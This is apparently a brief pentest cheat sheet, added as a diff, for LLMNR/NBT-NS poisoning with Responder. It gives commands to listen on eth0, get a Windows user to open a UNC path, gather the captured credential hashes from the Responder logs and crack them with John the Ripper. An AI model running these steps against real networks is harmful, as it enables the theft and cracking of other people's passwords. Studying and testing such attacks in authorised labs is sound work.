@@ -1,0 +1,23 @@
+
+
+Responder
+
+#Based  on LLMNR/NBT-NS  port udp 5355/137
+
+On kali /
+Responder -I eth0
+---------------------------
+
+On windows
+1) try to open from  run  e.g    \\tools\
+
+---------------------------
+On kali /
+
+#Responder now will collect credentials hashed and store it on
+Usr/share/responder/logs
+
+
+
+#To crack the passwords 
+john  /usr/share/responder/logs/<file name of the logs.txt>
